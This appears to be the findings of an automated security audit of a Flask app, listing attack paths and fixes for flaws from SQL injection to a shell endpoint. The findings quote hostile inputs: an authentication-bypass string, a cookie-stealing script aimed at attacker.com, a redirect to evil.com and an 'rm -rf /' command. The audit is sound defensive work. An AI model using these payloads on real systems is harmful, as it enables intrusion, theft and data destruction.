issues.attack_path: Attacker reads source code or git history and extracts the SECRET_KEY, then forges session cookies or JWT tokens.
issues.recommendation: Load from environment variable: SECRET_KEY = os.environ.get('SECRET_KEY') and raise an error if not set.

issues.attack_path: Attacker sends username=' OR '1'='1 to bypass authentication or extract all user records from the database.
issues.recommendation: Use parameterized queries: cursor.execute('SELECT * FROM users WHERE username = ? AND password = ?', (username, password))
issues.code_snippet: query = "SELECT * FROM users WHERE username = '%s' AND password = '%s'" % (username, password)

issues.attack_path: An attacker can use timing differences in string comparison to brute-force token values byte by byte.
issues.recommendation: Use hmac.compare_digest(token, user['token']) for constant-time comparison.

issues.attack_path: Attacker crafts URL with ?name=<script>document.cookie='attacker.com/?c='+document.cookie</script> and tricks victim into clicking it.
issues.recommendation: Use Flask's render_template with Jinja2 auto-escaping, or use markupsafe.escape(name).

issues.attack_path: Attacker sends phishing link: /redirect?next=https://evil.com to redirect victims after login.
issues.recommendation: Validate redirect target against an allowlist of internal paths before redirecting.

issues.attack_path: Attacker crafts a malicious pickle payload that executes arbitrary OS commands when deserialized.
issues.recommendation: Never deserialize untrusted data with pickle. Use json.loads() or a safe schema-validated format.

issues.attack_path: random.randint is seeded by time; attacker can predict 6-digit tokens and use them for account takeover.
issues.recommendation: Use secrets.randbelow(900000) + 100000 for cryptographically secure token generation.

issues.attack_path: MD5 hashes are precomputed in rainbow tables; attacker with database access can reverse all password hashes instantly.
issues.recommendation: Use bcrypt or argon2: from argon2 import PasswordHasher; ph = PasswordHasher(); ph.hash(pw)

issues.attack_path: Attacker calls /run?cmd=rm+-rf+/ or any shell command, achieving full remote code execution.
issues.recommendation: Remove this endpoint entirely. If needed, use subprocess with a fixed command list and no shell=True.

patches.explanation: Load secret from environment variable instead of hardcoding.
